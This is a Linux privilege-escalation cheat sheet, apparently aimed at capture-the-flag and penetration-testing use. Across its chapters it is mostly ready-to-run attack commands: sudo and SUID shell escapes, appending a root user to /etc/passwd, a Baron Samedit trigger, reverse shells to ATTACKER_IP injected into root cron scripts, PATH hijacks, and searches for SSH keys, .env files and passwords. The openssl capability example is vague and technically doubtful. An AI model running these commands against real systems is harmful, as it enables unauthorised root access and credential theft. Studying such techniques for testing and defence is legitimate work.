Chapter 01 // Start Here

🔍 The golden rule: Enumerate first

Every PrivEsc challenge (and real engagement) starts the same way: you got a low-privilege shell. You need root. Don't guess — enumerate. The answer is always there if you look in the right places.

The PrivEsc Mindset 🧠

Think about WHAT runs as root. On a Linux system, root runs:

  • SUID/SGID binaries (run as file owner, not as you)
  • Cron jobs (scheduled commands, often as root)
  • Services and daemons
  • Anything you can sudo

Your job: find something root runs that you can influence or abuse.

First commands after getting a shell

## ── WHO AM I? ──────────────────────────────────────────── id # user, uid, groups whoami # username hostname # machine name uname -a # kernel version (for kernel exploits) cat /etc/os-release # OS version cat /proc/version # kernel version + compiler ## ── WHAT CAN I DO AS SUDO? ──────────────────────────────── sudo -l # ALWAYS run this first. Gold mine. ## ── WHAT USERS EXIST? ──────────────────────────────────── cat /etc/passwd # list users (shell = /bin/bash means interactive) cat /etc/shadow # password hashes (need root to read usually) getent passwd # same as passwd but pulls from all sources ## ── ENVIRONMENT ────────────────────────────────────────── env # environment variables (look for passwords, paths) echo $PATH # where commands are looked up history # command history (often has creds!) cat ~/.bash_history

Chapter 02 // Sudo Abuse

🔑 Sudo — The Most Common Win

sudo -l shows what commands you can run as another user (usually root). Even "safe" programs have GTFOBins techniques to spawn shells.

## First thing after shell — ALWAYS: sudo -l ## Example output (jackpot): User www-data may run the following commands on target: (root) NOPASSWD: /usr/bin/python3 /opt/backup.py (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/find /var/www/html

Top sudo binaries and their GTFOBins escapes

📝 vim / nano / less

# vim → root shell sudo vim -c ':!/bin/bash' # nano: open /etc/sudoers, add yourself sudo nano /etc/sudoers # add: yourusername ALL=(ALL) NOPASSWD: ALL # less → shell escape sudo less /etc/passwd # then type: !/bin/bash

🐍 python / python3

# Spawn root shell: sudo python3 -c 'import os; os.system("/bin/bash")' # Or with pty (better shell): sudo python3 -c 'import pty; pty.spawn("/bin/bash")' # Write to /etc/passwd: sudo python3 -c ' import crypt,os h=crypt.crypt("hacked","$6$salt") open("/etc/passwd","a").write(f"hacker:{h}:0:0::/root:/bin/bash\n") '

🔍 find

# Execute shell via find: sudo find . -exec /bin/sh \; -quit # Or: sudo find / -name whatever -exec /bin/bash \; # Even if restricted path: sudo find /var/www/html -exec /bin/sh \; -quit

☕ java / perl / ruby / awk

# perl: sudo perl -e 'exec "/bin/bash";' # ruby: sudo ruby -e 'exec "/bin/bash"' # awk: sudo awk 'BEGIN {system("/bin/bash")}' # Always check: gtfobins.github.io

Sudo version exploit

💀 CVE-2021-3156 — Baron Samedit (sudo < 1.9.5p2)
A heap-based buffer overflow in sudo. Allows any unprivileged user to gain root on Ubuntu, Debian, Fedora, CentOS — without needing sudo permissions at all. Just having sudo installed is enough.
Check version: sudo --version
Exploit: sudoedit -s '\' $(python3 -c 'print("A"*65536)')

Chapter 03 // SUID Binaries

🔴 SUID — Run as the File Owner

SUID (Set User ID) means: when you run this binary, it runs with the file owner's permissions, not yours. If root owns a SUID binary — it runs as root. Even if YOU run it.

## Find ALL SUID binaries on the system: find / -perm -4000 -type f 2>/dev/null ## Find SUID + SGID: find / -perm -4000 -o -perm -2000 -type f 2>/dev/null ## Example output (spot the problem): /usr/bin/passwd ← legitimate (needed to change passwords) /usr/bin/sudo ← legitimate /usr/bin/find ← WAIT. find is SUID owned by root?! 🚨 /opt/custom_backup ← custom binary? 🚨🚨🚨

Exploiting common SUID binaries

## bash with SUID (the dream): ls -la /bin/bash # if SUID bit set: /bin/bash -p # -p preserves effective UID = root shell ## cp with SUID: # Method 1: Copy /etc/shadow to readable location /usr/bin/cp /etc/shadow /tmp/shadow cat /tmp/shadow | grep root # crack the hash offline # Method 2: Overwrite /etc/passwd echo 'hacker:$(openssl passwd hacked):0:0::/root:/bin/bash' >> /etc/passwd ## nmap with SUID (old versions): nmap --interactive # old nmap had interactive mode # at nmap prompt: !sh ## Custom binary with SUID — analyze it: strings /opt/custom_backup # readable strings ltrace /opt/custom_backup # library calls strace /opt/custom_backup # system calls # Look for: relative path calls → PATH hijack opportunity
💀 CVE-2021-4034 — PwnKit (pkexec)
A vulnerability in pkexec (always SUID, installed everywhere). Present since 2009. Affects ALL major Linux distros. Local privilege escalation with a one-click exploit.

Chapter 04 // Cron Jobs

⏰ Cron — Scripts Running on a Schedule

Cron jobs are commands that run automatically on a schedule. Many admins write backup scripts, cleanup scripts, or monitoring scripts — and run them as root. If you can modify those scripts, you own root.

## Check all cron locations: crontab -l # your user's crons sudo crontab -l # root's crons (if you can sudo) cat /etc/crontab # system-wide crons cat /etc/cron.d/* # additional cron files ls -la /etc/cron.{hourly,daily,weekly,monthly}/ # time-based crons ## Watch crons executing in real time: watch -n 1 "ps aux | grep -v grep | grep -E 'cron|backup|script'" ## pspy — monitor processes without root (essential tool): ./pspy64 # shows ALL processes including those spawned by cron # Download: github.com/DominicBreuker/pspy

Attack: Writable script run by root cron

## Scenario: /etc/crontab has: * * * * * root /opt/backup.sh # runs every minute as root ## Check permissions: ls -la /opt/backup.sh -rwxrwxrwx 1 root root 45 Jan 1 00:00 /opt/backup.sh # world-writable! 🚨 ## Inject reverse shell payload: echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh ## On attacker machine — listen: nc -lvnp 4444 ## Wait 1 minute → root shell arrives ## Alternative: add root user to /etc/passwd echo 'echo "hacker:\$6\$salt\$HASH:0:0::/root:/bin/bash" >> /etc/passwd' >> /opt/backup.sh

Attack: Writable script DIRECTORY

## Even if the script isn't writable, if the DIRECTORY is: ls -la /opt/ # if /opt/ is writable by you ## Delete the original and replace it: mv /opt/backup.sh /opt/backup.sh.bak # Create your version: cat > /opt/backup.sh <<'EOF' #!/bin/bash bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 EOF chmod +x /opt/backup.sh

Chapter 05 // PATH Hijacking

🛣️ PATH Hijack — Make root run YOUR code

When a SUID binary or cron script calls another program using a relative path (like backup instead of /usr/bin/backup), it looks in the PATH directories to find it. You can put your evil version first.

## Scenario: SUID binary /opt/service calls 'ps' without full path strings /opt/service | grep -v lib | head -20 # Output includes: "ps" without /usr/bin/ps prefix → vulnerable! ## Exploit: # 1. Write your malicious 'ps' script: cat > /tmp/ps <<'EOF' #!/bin/bash /bin/bash -p # -p preserves SUID bit → root shell EOF chmod +x /tmp/ps # 2. Prepend /tmp to PATH: export PATH=/tmp:$PATH # 3. Run the SUID binary: /opt/service # it finds /tmp/ps first → your code runs as root!

Chapter 06 // Linux Capabilities

⚡ Capabilities — Partial Root Powers

Capabilities let a binary have specific root-like powers without being SUID. Admins think this is safer. They're often wrong — some capabilities lead straight to root.

## Find binaries with capabilities: getcap -r / 2>/dev/null ## Dangerous capabilities to look for: /usr/bin/python3.8 = cap_setuid+ep # can set UID → root shell /usr/bin/perl = cap_setuid+ep # same /usr/bin/ruby = cap_setuid+ep # same /usr/bin/vim = cap_dac_read_search+ep # read any file → /etc/shadow! /usr/bin/openssl = cap_setuid+ep # can become root
## cap_setuid on python3 → root shell: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' ## cap_dac_read_search on vim → read shadow file: vim /etc/shadow # file appears normally, read the hash, crack offline ## cap_setuid on openssl → root: openssl req -x509 -newkey rsa:4096 -keyout /tmp/key -out /tmp/cert -days 365 -nodes -subj '/CN=pwn' openssl s_server -key /tmp/key -cert /tmp/cert -port 4443 -quiet # connect back and setuid(0)

Chapter 07 // Passwords in Plain Sight

🗝️ Credentials Left in the Open

This one is embarrassingly common. Credentials in config files, history files, environment variables, and scripts. Always look here first — sometimes the path to root is just reading a file.

## History files — goldmine: cat ~/.bash_history cat ~/.zsh_history cat ~/.mysql_history cat ~/.nano_history ## Config files with passwords: find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null find / -name "wp-config.php" 2>/dev/null # WordPress DB creds find / -name "config.php" 2>/dev/null find / -name ".env" 2>/dev/null # Laravel, Django etc. find / -name "id_rsa" 2>/dev/null # SSH private keys ## Passwords in environment variables: env | grep -iE "pass|pwd|key|token|secret|credential" ## Database connection strings: grep -r "password" /var/www/ 2>/dev/null grep -r "DB_PASS" /var/www/ 2>/dev/null ## Check /opt, /home, /var/backups for anything interesting: ls -laR /opt/ 2>/dev/null ls -laR /home/ 2>/dev/null cat /var/backups/*
💡 Password reuse: If you find any password (database, application, backup), try it as: su root, su otheruser, and over SSH. Password reuse is real and common.
